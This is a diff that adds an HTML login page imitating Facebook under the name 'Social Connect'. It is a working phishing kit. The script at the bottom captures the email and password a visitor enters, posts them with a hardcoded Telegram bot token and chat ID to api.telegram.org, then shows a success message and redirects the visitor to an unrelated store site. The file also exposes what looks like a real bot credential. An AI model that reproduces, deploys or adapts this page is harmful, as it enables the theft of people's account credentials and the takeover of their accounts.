@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Connect - Log In or Sign Up</title>
+    <style>
+        :root {
+            --primary-color: #4267B2;
+            --secondary-color: #42b72a;
+            --text-color: #1c1e21;
+            --bg-color: #f0f2f5;
+            --card-color: #ffffff;
+            --border-color: #dddfe2;
+            --shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1000px;
+            width: 100%;
+            gap: 32px;
+        }
+
+        .left {
+            flex: 1;
+        }
+
+        .brand {
+            margin-bottom: 20px;
+        }
+
+        .brand img {
+            width: 240px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .brand h2 {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 1.3;
+            color: var(--text-color);
+        }
+
+        .right {
+            flex: 1;
+            max-width: 400px;
+        }
+
+        .form-container {
+            background-color: var(--card-color);
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            padding: 24px;
+            width: 100%;
+        }
+
+        .form-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: var(--primary-color);
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(66, 103, 178, 0.2);
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #385999;
+        }
+
+        .btn-secondary {
+            background-color: var(--secondary-color);
+            color: white;
+            margin-top: 16px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #36a420;
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .divider span {
+            padding: 0 10px;
+            color: #65676b;
+            font-size: 14px;
+        }
+
+        .form-footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .form-footer a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+        }
+
+        .loading-spinner {
+            border: 4px solid rgba(66, 103, 178, 0.3);
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .alert {
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .alert-error {
+            background-color: #ffebee;
+            color: #c62828;
+            border: 1px solid #ffcdd2;
+        }
+
+        .alert-success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .left,
+            .right {
+                flex: none;
+                width: 100%;
+                max-width: 100%;
+            }
+
+            .brand h2 {
+                max-width: 400px;
+                margin: 0 auto;
+            }
+
+            .form-container {
+                max-width: 400px;
+                margin: 0 auto;
+            }
+        }
+
+        .login-container {
+            border-radius: 8px;
+            width: 350px;
+            padding: 4px;
+            text-align: center;
+            background-color: #385999;
+        }
+
+        .login-container img {
+            width: 50px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="left">
+            <div class="brand">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Social Connect">
+            </div>
+        </div>
+        <div class="right">
+            <div class="form-container">
+                <h3 class="form-title">Log in to your account</h3>
+                <div id="error-message" class="alert alert-error"></div>
+                <div id="success-message" class="alert alert-success">Login information sent successfully!</div>
+                <form id="login-form">
+                    <div class="input-group">
+                        <label for="email">Email or Phone Number</label>
+                        <input type="text" id="email" placeholder="Enter your email or phone" required>
+                    </div>
+                    <div class="input-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter your password" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Log In</button>
+                    <div class="divider">
+                        <span>or</span>
+                    </div>
+                </form>
+                <a href="/log in/gmail.html" class="forgot-password">
+                    <div class="login-container">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/2560px-Gmail_icon_%282020%29.svg.png"
+                            alt="Gmail Logo" class="logo">
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function (event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+            const successMessage = document.getElementById('success-message');
+            const form = document.getElementById('login-form');
+            const loading = document.querySelector('.loading');
+
+            errorMessage.style.display = 'none';
+            errorMessage.textContent = '';
+            successMessage.style.display = 'none';
+
+            if (!validateEmail(email)) {
+                showError('Please enter a valid email address.');
+                return;
+            }
+
+            form.style.display = 'none';
+            loading.style.display = 'block';
+
+            const botToken = '7775302991:AAGhN0WzRQ7FNu4z_TJkOTPU6peAPZuMlnU';
+            const chatId = '1732455712';
+            const message = `New login:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    loading.style.display = 'none';
+                    form.style.display = 'block';
+                    if (data.ok) {
+                        successMessage.style.display = 'block';
+                        setTimeout(() => {
+                            window.location.href = 'https://www.nhoy.store';
+                        }, 1000);
+                    } else {
+                        showError('Failed to send login info. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    loading.style.display = 'none';
+                    form.style.display = 'block';
+                    showError('Network error. Please try again later.');
+                });
+        });
+
+        function validateEmail(email) {
+            const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+            return re.test(String(email).toLowerCase());
+        }
+
+        function showError(message) {
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+        }
+    </script>
+</body>
+
+</html>
